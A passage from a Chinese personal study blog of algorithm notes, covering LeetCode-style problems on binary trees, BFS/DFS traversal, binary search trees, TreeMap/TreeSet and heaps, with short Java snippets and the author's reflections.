b.当insert新节点时，队列中存储的就是这个不完全节点，设置该节点的left或right属性，只有在right属性设置完毕，才能从队列中删除该不完全节点，并将left和right加入队列；因为这里存在一种特殊情况，如果不完全节点有left属性，而判断right==<span class="literal">null</span>的逻辑中只加入right到队列，就会使left节点没有放入，构造函数中并没有把这个left放入；</span><br><span class="line">    c.当get_root时，返回最初记录的root节点即可，队列中并不存放完整树，而是存放当前遍历到的节点；</span><br></pre></td></tr></table></figure><h3 id="044、二叉树每层的最大值（515、9月11日）"><a href="#044、二叉树每层的最大值（515、9月11日）" class="headerlink" title="044、二叉树每层的最大值（515、9月11日）"></a>044、二叉树每层的最大值（515、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，广度优先遍历。为每层维护一个len，记录该层节点数目，通过<span class="keyword">while</span>(len&gt;<span class="number">0</span>)遍历队列中节点，通过Math.max(maxVaule,t.val)更新该层最大值，将其子节点加入队列。这样当len为<span class="number">0</span>时跳出循环，队列中为新的一层节点，len更新为新层的节点数目，并重复上述。（关键词，len记录层节点数目）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，深度优先遍历。深度优先遍历时，假如访问root后再访问root.left，这时result.size为<span class="number">1</span>，深度<span class="number">0</span>+<span class="number">1</span>=<span class="number">1</span>，深度==result.size，这时就能把root.left节点的值放入到result。即最先遍历到该层的节点先将值放入result占位，后来再遍历到该层其他节点时，在result中更新该层深度对应的值。（关键词，通过深度在result中索引）</span><br></pre></td></tr></table></figure><h3 id="045、二叉树最底层最左边的值（513、9月11日）"><a href="#045、二叉树最底层最左边的值（513、9月11日）" class="headerlink" title="045、二叉树最底层最左边的值（513、9月11日）"></a>045、二叉树最底层最左边的值（513、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，广度优先遍历。为每层维护一个len，记录该层节点数目，通过<span class="keyword">while</span>(len&gt;<span class="number">0</span>)遍历队列中节点。当遍历到新层时，len更新为该层的节点数目，并将result更新为当前队列头部元素的值。这道题和第<span class="number">44</span>题广度解法一致。（关键词，len记录层节点数目）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，广度优先遍历。从右往左遍历队列中的节点，这样最底层最左边的元素，就是被最后一个访问到，记录该值即可。（关键词，从右往左）</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，深度优先遍历。用height记录遍历到的节点高度，用curHeight记录上一次更新result的高度。遍历每个节点时，先深度遍历其左子节点，再深度遍历其右子节点，直到子节点为<span class="literal">null</span>时返回。由于只在超过curHeight时才更新curHeight和result，因此到达最底层时只会更新依次result。（关键词，存档点）</span><br><span class="line">    注意，这里将curHeight和result设置为类变量，不放入函数参数，这里涉及到修改形参的知识。</span><br></pre></td></tr></table></figure><h3 id="046、二叉树的右侧视图（199、9月11日）"><a href="#046、二叉树的右侧视图（199、9月11日）" class="headerlink" title="046、二叉树的右侧视图（199、9月11日）"></a>046、二叉树的右侧视图（199、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，广度优先遍历。为每层维护一个len，记录该层节点数目，通过<span class="keyword">while</span>(len&gt;<span class="number">0</span>)遍历队列中节点。当每层len变为<span class="number">0</span>时，说明正在访问该层的最右侧节点，将节点值放入result。这道题和第<span class="number">44</span>题广度解法一致。（关键词，len记录层节点数目）</span><br></pre></td></tr></table></figure><h3 id="总结之队列"><a href="#总结之队列" class="headerlink" title="总结之队列"></a>总结之队列</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>队列相关api记录复制：</span><br><span class="line">Deque&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();  <span class="comment">//队列是尾部添加，头部删除</span></span><br><span class="line">offer(): 在队列尾部添加新元素，如果队列已满，返回<span class="literal">false</span>。add方法会抛出异常；</span><br><span class="line">poll()：获取并移除此队列的头，如果此队列为空，则返回<span class="literal">null</span>。remove方法会抛出异常；</span><br><span class="line"> peek()：用于在队列头部查询元素，如果此队列为空，返回<span class="literal">null</span>。element方法会抛出异常；</span><br><span class="line"><span class="number">2.</span>用队列解决广度优先遍历：这是一种经典的方法，当遍历到某层节点时，将其左右子节点分别放入队列，这样就能保持广度优先遍历。每次遍历将父节点从队列前端poll掉，又在队列尾端offer其左右子节点。</span><br><span class="line"><span class="number">3.</span>java改变传入参数的值（在深度优先遍历、回溯时经常遇到）：</span><br><span class="line">对于基本数据类型，实现的是传值，只是个形参，不会改变原有值。对于引用数据类型，对这个引用进行操作，其实也是相当于对形参的操作，不会改变原来的引用。但是，当对这个引用的属性进行操作的时候，相当于CPP中的传址调用，可以改变这个引用的属性的值。</span><br><span class="line">即修改形参，基本类型不会改变值，引用类型会改变值。如果是类变量，则会更加清晰必然修改。</span><br><span class="line"><span class="number">4.</span>队列问题的体会：</span><br><span class="line">a.队列从来不作为完整存储容器，不是作为滑动窗口，就是为树存储当前遍历到的节点；</span><br><span class="line">b.用队列做广度优先遍历是经典方法，堪比反转链表，只要记住维护len变量记录层节点数目即可；</span><br><span class="line">c.遍历访问树节点时，判断左右子树是否存在，不用<span class="keyword">if</span>...<span class="keyword">else</span>，而是<span class="keyword">if</span>、<span class="keyword">if</span>单独判断，比如只有右子树存在的情况，<span class="keyword">if</span>...<span class="keyword">else</span>就不好。</span><br></pre></td></tr></table></figure><h2 id="第八章、树"><a href="#第八章、树" class="headerlink" title="第八章、树"></a>第八章、树</h2><h3 id="047、二叉树剪枝（814、9月11日）"><a href="#047、二叉树剪枝（814、9月11日）" class="headerlink" title="047、二叉树剪枝（814、9月11日）"></a>047、二叉树剪枝（814、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，深度优先遍历。dfs函数设置布尔返回值，对于每个节点，如果左子树、右子树或者本身含<span class="number">1</span>（满足任何一个），则立刻返回<span class="literal">true</span>，否则返回<span class="literal">false</span>。如果深度遍历到最底层<span class="literal">null</span>还没返回，说明这棵子树不含<span class="number">1</span>，返回<span class="literal">false</span>；当左、右子树不含<span class="number">1</span>时，将其置为<span class="literal">null</span>。</span><br><span class="line">注意，当输入全<span class="number">0</span>的树时，dfs处理后只剩根节点[<span class="number">0</span>]，但这不符合输出要求。此时，左右子树均为<span class="literal">null</span>，且标志位为<span class="literal">false</span>，要根据标志位决定是返会root节点，还是直接返回<span class="literal">null</span>，而不是<span class="keyword">new</span> <span class="title class_">TreeNode</span>()。（关键词，左右<span class="number">2</span>个标志位）</span><br></pre></td></tr></table></figure><h3 id="048、序列化与反序列化树（297、9月12日）"><a href="#048、序列化与反序列化树（297、9月12日）" class="headerlink" title="048、序列化与反序列化树（297、9月12日）"></a>048、序列化与反序列化树（297、9月12日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，<span class="string">&#x27;,&#x27;</span>分割+满二叉树+队列实现广度优先遍历。这道题是困难题，结合了StringBuilder、字符串分割、和队列等知识，但我竟然本地调试后，提交一次就通过了，简直unbelievable！！耍！</span><br><span class="line">（<span class="number">1</span>）序列化时，</span><br><span class="line">    a.每层节点当其本身不等于<span class="literal">null</span>时，就将其值放入StringBuilder，并将左、右子节点放入队列（不管是否为<span class="literal">null</span>）；</span><br><span class="line">    b.等于<span class="literal">null</span>时，就将“<span class="literal">null</span>,”放入StringBuilder，这样能实现满二叉树，底层没有元素的位置会被填入<span class="literal">null</span>，且<span class="literal">null</span>节点的孩子节点不会被放入队列；</span><br><span class="line">    c.输出字符串<span class="string">&quot;1,2,3,null,null,4,5,null,null,null,null,&quot;</span>；</span><br><span class="line">（<span class="number">2</span>）反序列化时，</span><br><span class="line">    a.先通过split(<span class="string">&quot;,&quot;</span>)将节点数值分割出来，再根据索引遍历，最后一个逗号后面的空不会被设为字符；</span><br><span class="line">    b.遍历时，先peek队列头部，再将本字符串转为TreeNode，如果不为<span class="literal">null</span>，则加入队列；先peek是考虑到，首字符串放入队列再peek得到的是它本身；</span><br><span class="line">    c.这时候队列维护的是“没被安装左、右子节点的parent节点”，观察到对于满二叉树，索引为奇数时是左子节点，为偶数时是右子节点，根据这一规律，在队列头部节点被安装好后poll掉它；且要设置root变量记住根节点，以便返回；（关键词，满二叉树）</span><br></pre></td></tr></table></figure><h3 id="049、从根节点到叶节点的路径数字之和（129、9月12日）"><a href="#049、从根节点到叶节点的路径数字之和（129、9月12日）" class="headerlink" title="049、从根节点到叶节点的路径数字之和（129、9月12日）"></a>049、从根节点到叶节点的路径数字之和（129、9月12日）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.思路1，深度优先搜索。因为路径相关问题，大都采用深度优先搜索。这道题用dfs更方便的原因，还在于通过path = path*10+root.val;求当前累积和，比如路径为3-&gt;9-&gt;5，3*10+9=39，39*10+5=395，就能直接把路径数字表示出来。</span><br><span class="line">对于每个节点，返回其左、右子树的累积结果时，直接return dfs(root.left,path)+dfs(root.right,path)，比如path=39，391+395=...，这都是从数值为9的节点开始的全部路径和。注意叶子节点为null，则返回0。（关键词，dfs相加）</span><br></pre></td></tr></table></figure><h3 id="050、向下的路径节点之和（437、9月12日）"><a href="#050、向下的路径节点之和（437、9月12日）" class="headerlink" title="050、向下的路径节点之和（437、9月12日）"></a>050、向下的路径节点之和（437、9月12日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，深度优先搜索+前缀和+回溯。咋这几道中等题反而越来越难想嘞？因为题目要求统计次数，故通过hashMap记录前缀和即可，键为当前累积和path，值为path的出现次数。</span><br><span class="line">    a.对于一条路径，不断深入的过程中path加上节点值，并使得hashMap中path对应的值增加<span class="number">1</span>，每次更新当前累积和path时，在hashMap中寻找(path-target)的出现次数，即为这条路径能提供的目标子串数目；</span><br><span class="line">    b.还要像题目<span class="number">49</span>，把path向左、右子节点传递下去，子节点dfs返回后，要将hashMap中path对应的值减<span class="number">1</span>，抹除本路径、本节点的影响，这样便是回溯。（关键词，前缀和、）</span><br><span class="line"><span class="number">2.</span>这道题的测试用例被添加了奇怪的东西，必须将path设置为<span class="number">64</span>位的Long。</span><br><span class="line"><span class="number">3.</span>DFS的代码都很短，但是想到却很困难。对于root节点到叶子节点的全部路径，或者从任意节点开始的部分路径，dfs怎样操作子节点还是不能轻松想到。再次遇到求部分和次数的题目，看来子数组、子串、子路径都要记住hashMap前缀和的方法。</span><br></pre></td></tr></table></figure><h3 id="051、节点之和最大的路径（124、9月12日）"><a href="#051、节点之和最大的路径（124、9月12日）" class="headerlink" title="051、节点之和最大的路径（124、9月12日）"></a>051、节点之和最大的路径（124、9月12日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，深度优先搜索。题目没有对路径限制，那对于每个节点有<span class="number">3</span>种情况，但我分析不出返回值该是啥：</span><br><span class="line">    a.b.从其他节点延申过来，经过其左子树或者右子树的路径；</span><br><span class="line">    c.从其左子树开始，经过本节点，再经过其右子树的路径；</span><br><span class="line">我的疑虑主要在，从root节点到某子节点的路径和某节点自身的左右两边路径，这两种情况怎么设计返回值？</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，深度优先搜索。对于每个节点来说，返回值是其本身的值，加上左子树或者右子树返回的值或者<span class="number">0</span>，这样它不是这条路径的核心，不同时提供左右子树，只提供一个边；对于每个节点来说(想象成root节点)，它通过比较左、右子树的返回值、以及两个返回值加上它本身这<span class="number">3</span>个对象，就能覆盖其节点上的最值信息。（关键词，返回root.val+max(left,right)）</span><br><span class="line"><span class="number">3.</span>这道题很困难，代码简单能量爆炸。</span><br></pre></td></tr></table></figure><h3 id="052、展平二叉搜索树（897、9月13日）"><a href="#052、展平二叉搜索树（897、9月13日）" class="headerlink" title="052、展平二叉搜索树（897、9月13日）"></a>052、展平二叉搜索树（897、9月13日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，二叉树中序遍历。因为二叉搜索树本身就维护了递增顺序，只需对其中序遍历，将节点放入List，再按照List中的顺序连接。连接时需要将每个节点的左指针置为空，右指针指向List下一节点，最后节点右指针置为空，记住新的root节点即可。（关键词，中序遍历）</span><br><span class="line">    本题中序遍历用dfs递归实现。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，二叉树中序遍历。List中可以不放节点，而是放节点值，重组时新建节点。</span><br><span class="line"><span class="number">3.</span>二叉搜索树，左子节点总是小于或等于根节点，而右子节点总是大于或等于根节点。</span><br></pre></td></tr></table></figure><h3 id="053、二叉搜索树中的中序后继（285、9月13日）"><a href="#053、二叉搜索树中的中序后继（285、9月13日）" class="headerlink" title="053、二叉搜索树中的中序后继（285、9月13日）"></a>053、二叉搜索树中的中序后继（285、9月13日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，栈实现中序遍历。设置标志位flag初始为<span class="literal">false</span>，栈实现中序遍历代码中，弹栈时当前节点等于目标节点，则将标志位flag置为<span class="literal">true</span>。由于当前节点的右指针为<span class="literal">null</span>时会弹栈，这时flag等于<span class="literal">true</span>跳出循环，当前节点就是目标节点。（关键词，栈实现、标志位）</span><br><span class="line"><span class="number">2.</span>本来准备用dfs递归实现，但在函数递归调用中传递标志位，并考虑返回值好麻烦，没找到时返回值咋设置。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，二叉搜索树。二叉搜索树自身就有排序功能，能根据其性质按照正确的方向去寻找，每个节点比目标值大则向左找，否则向右。注意只在比目标值大时，才将结果节点result更新储存当前节点，因为接下来往左找时新的当前节点值可能小于等于目标值，等于时result中确实存储其中序后继，小于时则不可能是中序后继。（关键词，大于目标是更新result）</span><br></pre></td></tr></table></figure><h3 id="054、所有大于等于节点的值之和（538、1038、9月13日）"><a href="#054、所有大于等于节点的值之和（538、1038、9月13日）" class="headerlink" title="054、所有大于等于节点的值之和（538、1038、9月13日）"></a>054、所有大于等于节点的值之和（538、1038、9月13日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，递归实现先遍历右子树。这道题一看涉及到累积和path，那肯定传参path，返回path。因为是二叉搜索树，根据题目应该先访问右节点，再中间节点，最后是左节点。dfs辅助函数根据前面的遍历顺序修改path值，注意如果节点等于<span class="literal">null</span>，应该返回path而不是返回<span class="number">0</span>，因为dfs函数返回的是修改后的path值，而不是修改量。（关键词，反序中序遍历）</span><br></pre></td></tr></table></figure><h3 id="055、二叉搜索树迭代器（173、9月15日）"><a href="#055、二叉搜索树迭代器（173、9月15日）" class="headerlink" title="055、二叉搜索树迭代器（173、9月15日）"></a>055、二叉搜索树迭代器（173、9月15日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，栈实现中序遍历。这道题看了很多遍不知道到底在说什么，就看了题解。next函数是返回二叉搜索树中下一个最小的节点值，因此每次访问next函数，先不断调用next指针并压栈使其触底，next弹栈一个元素取值后，将当前节点指向右指针，即完成了中序遍历。</span><br><span class="line">    （关键词，栈实现中序遍历）</span><br></pre></td></tr></table></figure><h3 id="056、二叉搜索树中两个节点之和（653、9月15日）"><a href="#056、二叉搜索树中两个节点之和（653、9月15日）" class="headerlink" title="056、二叉搜索树中两个节点之和（653、9月15日）"></a>056、二叉搜索树中两个节点之和（653、9月15日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，栈实现中序遍历+hashMap。这几道题都考察栈实现中序遍历，只需在弹栈时，在hashMap中寻找(k-val)，并将val加入hashMap，找到则返回<span class="literal">true</span>，双层<span class="keyword">while</span>循环结束则返回<span class="literal">false</span>。（关键词，栈实现中序遍历）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，双指针，先不做。</span><br></pre></td></tr></table></figure><h3 id="057、值和下标之差都在给定的范围内（220、9月15日）"><a href="#057、值和下标之差都在给定的范围内（220、9月15日）" class="headerlink" title="057、值和下标之差都在给定的范围内（220、9月15日）"></a>057、值和下标之差都在给定的范围内（220、9月15日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，TreeMap。维护一个TreeMap，键为数字，值为它在数组中的最新索引。从左向右遍历数组，取TreeMap中恰好小于等于（floor）、大于等于（ceiling）当前遍历数字的键，计算其是否满足要求，并将当前遍历数字和索引放入TreeMap。但是，这么做存在问题，假设（&#123;<span class="number">10</span>,<span class="number">100</span>,<span class="number">11</span>,<span class="number">9</span>&#125;，索引=<span class="number">1</span>，差值=<span class="number">2</span>）的数字，当遍历到<span class="number">9</span>时，ceiling会取<span class="number">10</span>，从而不满足条件，即使<span class="number">11</span>满足但不在逻辑中。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，TreeSet。维护一个TreeSet，键为数字，这里把它当作滑动窗口，当超过k时，就剔除nums[i-k]。其他步骤同上。此外，为了应付一些特殊测试用例，应该强制类型转换成<span class="number">64</span>位的<span class="type">long</span>。（关键词，滑动窗口）</span><br></pre></td></tr></table></figure><h3 id="058、日程表（729、9月15日）"><a href="#058、日程表（729、9月15日）" class="headerlink" title="058、日程表（729、9月15日）"></a>058、日程表（729、9月15日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，TreeMap。维护一个TreeMap，键为start，值为end。每次book时，（关键词，TreeMap）</span><br><span class="line">    a.先取小于等于start的最大键值对，如果value大于start，则返回<span class="literal">false</span>；</span><br><span class="line">    b.再取大于等于start的最小键值对，如果key小于end，则返回<span class="literal">false</span>；</span><br><span class="line">    因为题目规定[start,end)，因此再判断大小时，相等是没问题的，即首尾重合没有问题。</span><br><span class="line"><span class="number">2.</span>TreeSet和TreeMap使用起来很简单，遇到的题目，解题都是依次调用一遍floor和ceiling做判断，再put本元素即可。</span><br><span class="line"><span class="number">3.</span>HashMap和TreeMap是同级的，都继承AbstractMap。必须TreeMap&lt;Integer,Integer&gt; treeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();，如果前面Class为Map&lt;Integer,Integer&gt;，则会因为多态而失去TreeMap的方法。</span><br></pre></td></tr></table></figure><h3 id="总结之树"><a href="#总结之树" class="headerlink" title="总结之树"></a>总结之树</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>二叉树分类定义：</span><br><span class="line">满二叉树，除了叶子结点之外的每一个结点都有两个孩子结点；即只有有孩子，必然有两个；</span><br><span class="line">完全二叉树，除了最后一层之外的其他每一层都被完全填充，并且所有结点都保持向左对齐；和完美二叉树区别在，底层不一定完全填充；</span><br><span class="line">完美二叉树，除了叶子结点之外的每一个结点都有两个孩子，每一层(当然包含最后一层)都被完全填充，是完全二叉树的特例；</span><br><span class="line">二叉搜索树，左子节点总是小于或等于根节点，而右子节点总是大于或等于根节点；<span class="comment">//整个左子树小于根节点，而不单是左子节点小于</span></span><br><span class="line">平衡二叉树，二叉搜索树的特例，还需满足：a.左子树和右子树的高度之差的绝对值小于等于<span class="number">1</span>；b.左子树和右子树也是平衡二叉树；是为了避免二叉搜索树高度过高，使其查找、增加和删除的时间复杂度从O(h)退化到O(n)而存在；</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>DFS的代码都很短，但是想到却很困难。对于root节点到叶子节点的全部路径，或者从任意节点开始的部分路径，dfs怎样操作子节点还是不能轻松想到。再次遇到求部分和次数的题目，看来子数组、子串、子路径都要记住hashMap前缀和的方法。呜呜呜呜....</span><br><span class="line"><span class="number">3.</span>目前遇到的习题，二叉树章节基本考察dfs，队列章节则基本考察bfs。二叉树章节的前几道题，都是dfs的奇思妙想，但本章比较基础也比较关键的是，通过dfs（递归）实现前序、中序和后序遍历，另外更困难的遍历实现是利用栈。</span><br><span class="line">    </span><br><span class="line"><span class="number">4.</span>二叉树前序、中序和后序遍历，栈解法：</span><br><span class="line">    a.中序遍历，双层<span class="keyword">while</span>循环，内部循环顺着左指针一直向下移动并压栈，弹栈时访问值并将当前节点指向右指针；外层循环判断当前节点是否为<span class="literal">null</span>或者栈是否为空，并以新节点接续顺着左指针压栈；实际就是每到右指针指向节点，又开始遍历其左子树；（关键词，双<span class="keyword">while</span>）</span><br><span class="line">    b.前序遍历，双层<span class="keyword">while</span>循环，和中序遍历一致，就是内层循环一直移动左指针时，就访问节点值；即假设对于最底层节点（没有右指针），中序是在弹栈弹掉最底层节点时访问它的值，再弹栈其上层根节点并访问；前序是现在压栈时访问其上层根节点，再压栈并访问最底层节点，弹栈时不访问，因此根节点最先被访问到；（关键词，双<span class="keyword">while</span>、压栈时访问）</span><br><span class="line">    c.后序遍历，双层<span class="keyword">while</span>循环，和中序遍历一致，就是维护指针prev指向上一次访问的节点，帮助弹栈时做判断。</span><br><span class="line">      弹栈时（其实是peek栈顶，这里说弹栈指对应中序遍历的代码块），</span><br><span class="line">    如果当前节点cur右指针不为<span class="literal">null</span>且没有指向prev，说明还没有访问cur右子树，将cur指向cur.right进行循环，此时不弹栈；</span><br><span class="line">    其他情况下是经典操作，直接弹栈并访问弹出节点，将prev指针指向弹出节点做记录，将cur指向<span class="literal">null</span>，等待下次循环栈顶复制；</span><br><span class="line">（关键词，双<span class="keyword">while</span>，弹栈时判断右指针是否指向上一次cur）</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>Java根据红黑树这种平衡的二叉搜索树实现TreeSet和TreeMap两种数据结构，其查找、添加和删除操作的时间复杂度都是O(logn)；TreeSet常用api：</span><br><span class="line">    ceilling  <span class="comment">//返回键大于或等于给定值的最小键，没有则返回null；</span></span><br><span class="line">    floor  <span class="comment">//返回键小于或等于给定值的最大键，没有则返回null；</span></span><br><span class="line">    higher  <span class="comment">//返回键大于给定值的最小键，没有则返回null；</span></span><br><span class="line">    lower  <span class="comment">//返回键小于给定值的最大键，没有则返回null；</span></span><br><span class="line">TreeMap常用api和TreeSet一致，只是在方法名后加Entry或者Key表示返回键值对还是键，比较的时候都是比较键；</span><br><span class="line">如果题目出现数据集合是动态的，并需要根据数据的大小实现快速查找，则使用TreeSet或TreeMap。HashMap做不到这一点，是因为其只能判断某键是否存在，并不能有“比某键大的所有数字中最小的那一个”这种功能。</span><br><span class="line">    </span><br><span class="line"><span class="number">6.</span>TreeSet和TreeMap使用起来很简单，遇到的题目，解题都是依次调用一遍floor和ceiling做判断，再put本元素即可。    </span><br><span class="line"><span class="number">7.</span>HashMap和TreeMap是同级的，都继承AbstractMap。必须TreeMap&lt;Integer,Integer&gt; treeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();，如果前面Class为Map&lt;Integer,Integer&gt;，则会因为多态而失去TreeMap的方法。</span><br></pre></td></tr></table></figure><h2 id="第九章、堆"><a href="#第九章、堆" class="headerlink" title="第九章、堆"></a>第九章、堆</h2><h3 id="059、数据流的第K大数值（703、9月16日）"><a href="#059、数据流的第K大数值（703、9月16日）" class="headerlink" title="059、数据流的第K大数值（703、9月16日）"></a>059、数据流的第K大数值（703、9月16日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，暴力破解。维护一个List存放数字，每次添加元素时，使用官方api进行逆序排列，再根据k索引到目标值。（关键词，集合api）</span><br><span class="line">Collections.sort(list, Comparator.reverseOrder());</span><br><span class="line"><span class="number">2.</span>Arrays.sort是数组排序，Collections.sort是集合排序，都可以传入Comparator接口的实现类，实现自定义排序。自定义排序这块还是不太熟悉，PriorityQueue、上面的逆排序都需要自定义排序比较器，后面需要掌握。</span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，最小堆。维护一个PriorityQueue，其默认是最小堆，堆顶是整个堆的最小值，这个堆的目的是保存数组中前k大的数字。设计add函数时，按如下逻辑。因为只维护了PriorityQueue，空间复杂度为O(k)。（关键词，前k大元素的最小堆）</span><br><span class="line">a.如果当前堆大小小于k，直接将数字添加到堆;</span><br><span class="line">b.如果当前堆大小大于等于k，且要添加的数字超过堆顶，删除堆顶，并将新数字放入PriorityQueue，否则无视新数字；</span><br><span class="line">c.这样每次返回堆顶，堆顶是前k大数字中的最小值，即为第k大的数字；</span><br><span class="line"> <span class="number">4.</span>最小堆常求前k大元素，最大堆常求前k小元素，是反的。</span><br></pre></td></tr></table></figure><h3 id="060、出现频率最高的k个数字（347、9月16日）"><a href="#060、出现频率最高的k个数字（347、9月16日）" class="headerlink" title="060、出现频率最高的k个数字（347、9月16日）"></a>060、出现频率最高的k个数字（347、9月16日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，最小堆。先遍历一遍，将数字和出现次数放入hashMap；再遍历hashMap，按照上一题的方式，不满时放入最小堆，满时比较堆顶元素决定是否删除堆顶并放入。但是，这么做出现了问题，因为放入堆时会根据数字大小构造最小堆，而不是数字频率。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，最小堆。维护一个PriorityQueue&lt;Map.Entry&lt;Integer,Integer&gt;&gt;，构造函数传入的Comparator用键的值比较。</span><br><span class="line">    PriorityQueue&lt;Map.Entry&lt;Integer,Integer&gt;&gt; minHeap =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;e1.getValue()-e2.getValue());</span><br><span class="line">这里用了lambda表达式。（关键词，最小堆放entry）</span><br></pre></td></tr></table></figure><h3 id="061、和最小的k个数对（373、9月16日）"><a href="#061、和最小的k个数对（373、9月16日）" class="headerlink" title="061、和最小的k个数对（373、9月16日）"></a>061、和最小的k个数对（373、9月16日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，最大堆。维护一个PriorityQueue&lt;<span class="type">int</span>[]&gt;，自定义Comparator如下：</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;(e2[<span class="number">0</span>]+e2[<span class="number">1</span>])-(e1[<span class="number">0</span>]+e1[<span class="number">1</span>]));</span><br><span class="line">两层<span class="keyword">for</span>循环遍历两个数组，按照上一题的方式，不满时放入最大堆，满时比较堆顶元素决定是否删除堆顶并放入。</span><br><span class="line">遍历完后，如果最大堆的大小小于k，则再两层<span class="keyword">for</span>循环遍历两个数组将所有结果放入返回值；否则将堆中结果放入返回值。</span><br><span class="line">（关键词，最大堆<span class="type">int</span>[]）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，我的想法优化。因为两个数组是递增排序的，双层<span class="keyword">for</span>循环时不必遍历全部元素，都只用遍历前k个：</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;Math.min(k,nums1.length);i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; Math.min(k,nums2.length); j++) &#123;</span><br><span class="line">  此外，可以用<span class="keyword">while</span>(!maxHeap.isEmpty())避免最大堆大小小于k，即双层<span class="keyword">for</span>的全部结果数目小于k的情况，不用额外再双<span class="keyword">for</span>原始数组。</span><br></pre></td></tr></table></figure><h3 id="总结之堆"><a href="#总结之堆" class="headerlink" title="总结之堆"></a>总结之堆</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>Arrays.sort是数组排序，Collections.sort是集合排序，都可以传入Comparator接口的实现类，实现自定义排序。自定义排序这块还是不太熟悉，PriorityQueue、上面的逆排序都需要自定义排序比较器，后面需要掌握。</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>堆分类定义（堆通常用完全二叉树实现，最大特点是最值位于堆顶）：</span><br><span class="line">    最大堆，每个节点的值总是大于或等于其任意子节点的值；在最大堆中，根节点就是整个堆的最大值；</span><br><span class="line">    最小堆，每个节点的值总是小于或等于其任意子节点的值；在最小堆中，根节点就是整个堆的最小值；</span><br><span class="line"><span class="number">3.</span>堆的经典面试题，就是求一个数据集合中值最大或最小的k个元素；如果面试题是求出一个动态集合中的最大值或最小值，考虑用堆。最小堆常求前k大元素，最大堆常求前k小元素，是反的。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>Java提供了PriorityQueue实现堆结构，默认情况下是一个最小堆，如果使用最大堆调用构造函数时就需要传入Comparator改变比较排序规则，其常用api：</span><br><span class="line">add(e)  <span class="comment">//插入新的元素，会抛出异常；而offer(e)等效但不抛异常，而是返回null</span></span><br><span class="line">remove  <span class="comment">//删除堆顶元素，会抛出异常；而poll等效但不抛出异常，而是返回null</span></span><br><span class="line">element <span class="comment">//返回堆顶元素，会抛出异常；而peek等效但不抛出异常</span></span><br><span class="line">    Java中PriorityQueue实现了Queue接口，但它并不是一个队列，不按照“先入先出”顺序删除元素；它本质是一个堆，每次调用remove或者poll都是删除堆顶元素。最大堆中每次删除值最大的元素，最小堆中每次删除值最小的元素。element和peek同理。</span><br><span class="line"><span class="number">5.</span>PriorityQueue中，使用lambda表达式自定义Comparator例子：</span><br><span class="line">   PriorityQueue&lt;Map.Entry&lt;Integer,Integer&gt;&gt; minHeap =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;e1.getValue()-e2.getValue()); </span><br></pre></td></tr></table></figure><h2 id="第十章、前缀树"><a href="#第十章、前缀树" class="headerlink" title="第十章、前缀树"></a>第十章、前缀树</h2><h3 id="062、实现前缀树（208、9月16日）"><a href="#062、实现前缀树（208、9月16日）" class="headerlink" 